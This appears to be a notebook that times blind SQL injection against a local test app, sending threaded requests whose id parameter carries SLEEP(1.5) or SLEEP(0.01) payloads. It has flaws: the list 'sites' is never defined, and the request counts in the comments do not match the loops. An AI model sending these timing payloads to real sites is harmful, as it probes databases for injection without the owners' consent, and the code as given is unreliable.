# blind sql injection test
## the goal is to send two sleep requests to an url which has high and low sleep times to show if site is vulnerable or not
## the classic methods was too slow, threading was used to speed up the process

```python
import numpy as np
import pandas as pd
import matplotlib.pyplot as plt
import time
```

```python
# sleep time is 1.5 secs, 30 requests. result is 74 seconds total, 2.5 secs each requests
import concurrent.futures
import requests
import threading
import time


thread_local = threading.local()

def get_site(url):
    with requests.get(url) as response:
        print(f"{url}")


def get_all_sites(sites):
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        executor.map(get_site, sites)


if __name__ == "__main__":
    for h in range(20):
        sites.append("http://localhost:5000/vulnerable/{}/page?id=SLEEP(1.5)".format(h))
    start_time = time.time()
    get_all_sites(sites)
    duration = time.time() - start_time
    print(f"Got {len(sites)} in {duration} seconds")
```

```python
# sleep time is 0.01 secs, 230 requests. result is 233 seconds total , 1 second each

if __name__ == "__main__":
    for h in range(20):
        sites.append("http://localhost:5000/vulnerable/{}/page?id=SLEEP(0.01)".format(h))
    start_time = time.time()
    get_all_sites(sites)
    duration = time.time() - start_time
    print(f"Got {len(sites)} in {duration} seconds")
```
